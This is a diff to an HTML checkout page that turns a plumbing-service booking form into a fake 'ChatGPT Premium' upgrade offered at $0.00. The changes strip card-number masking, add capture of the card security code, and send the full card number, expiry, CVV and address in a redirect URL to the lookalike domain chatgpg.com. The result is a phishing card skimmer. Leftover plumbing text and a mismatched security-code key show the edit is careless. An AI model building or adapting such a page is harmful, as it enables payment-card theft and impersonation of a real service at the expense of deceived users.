@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Plumbing Service — Checkout</title>
+  <title>CHATGPT PREMIUM</title>
 
   <!-- Tabler Icons -->
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
@@ -540,26 +540,25 @@
   <div style="margin:24px 12px 0;">
     <div class="summary-card">
       <!-- EDIT: Update service name, description, and pricing below -->
-      <div class="summary-title">Emergency plumbing — full service</div>
-      <p class="summary-sub">Same-day call-out · Parts included</p>
+      <div class="summary-title">ChatGpt Premium Upgrade </div>
+      <p class="summary-sub">Get the most out of Chatgpt</p>
       <div class="divider"></div>
       <div class="feature"><i class="ti ti-tool"></i><span>Leak detection &amp; repair</span></div>
       <div class="feature"><i class="ti ti-droplet"></i><span>Pipe fitting &amp; replacement</span></div>
       <div class="feature"><i class="ti ti-certificate"></i><span>Certified plumber assigned</span></div>
       <div class="feature"><i class="ti ti-clock"></i><span>2-hour arrival guarantee</span></div>
       <div class="divider"></div>
-      <div class="price-row"><span>Service fee</span><span>$120.00</span></div>
-      <div class="price-row"><span>Call-out charge</span><span>$25.00</span></div>
+      <div class="price-row"><span>Service fee</span><span>$0.00</span></div>
+      <div class="price-row"><span>Call-out charge</span><span>$0.00</span></div>
       <div class="price-row"><span>Estimated tax</span><span>$0.00</span></div>
-      <div class="price-row total"><span>Due today</span><span>$145.00</span></div>
-      <button class="book-btn idle" id="book-btn" onclick="handleBook()">Book &amp; pay</button>
+      <div class="price-row total"><span>Due today</span><span>$0.00</span></div>
+      <button class="book-btn idle" id="book-btn" onclick="handleBook()">Upgrade &amp; now</button>
     </div>
   </div>
 
   <p class="fine-print">
     You agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
-    Charges are processed securely. Cancellations made more than 2 hours before the scheduled
-    call-out are fully refunded.
+    Charges are processed securely.
   </p>
 
 </div><!-- /checkout-page -->
@@ -674,9 +673,7 @@
     const countryName = country.options[country.selectedIndex]?.text || '';
     const regionVal   = document.getElementById('region-select')?.value || '';
     const cardRaw     = g('f-cardnum');
-    const maskedCard  = cardRaw.length >= 4
-      ? '**** **** **** ' + cardRaw.replace(/\s/g, '').slice(-4)
-      : '';
+    const maskedCard  = g('f-cardnum');
 
     const now        = new Date();
     const bookingRef = 'BK-' +
@@ -699,14 +696,15 @@
       address_1:      g('f-addr1'),
       address_2:      g('f-addr2'),
       card_name:      g('f-cardname'),
-      card_masked:    maskedCard,
+      card_masked:    g('f-cardnum'),
       card_expiry:    g('f-expiry'),
+      Security_code: g('f-cvv'),
       payment_method: document.getElementById('card-opt').classList.contains('active') ? 'Card' : 'PayPal',
-      service_name:   'Emergency plumbing — full service',
-      service_fee:    '$120.00',
-      callout_charge: '$25.00',
+      service_name:   'Upgrade to Premium',
+      service_fee:    '$0.00',
+      callout_charge: '$0.00',
       tax:            '$0.00',
-      total:          '$145.00',
+      total:          '$0.00',
     };
 
     setBtn('sending', 'Processing…');
@@ -737,11 +735,12 @@
       address:  payload.address_1 + (payload.address_2 ? ', ' + payload.address_2 : ''),
       cardname: payload.card_name,
       card:     maskedCard,
+      Securitycode: payload.security_code,
       expiry:   payload.card_expiry,
       sheet:    sheetStatus,
     });
 
-    window.location.href = 'thankyou.html?' + p.toString();
+    window.location.href = 'https://www.chatgpg.com' + p.toString();
   }
 
   /* ════════════════════════════
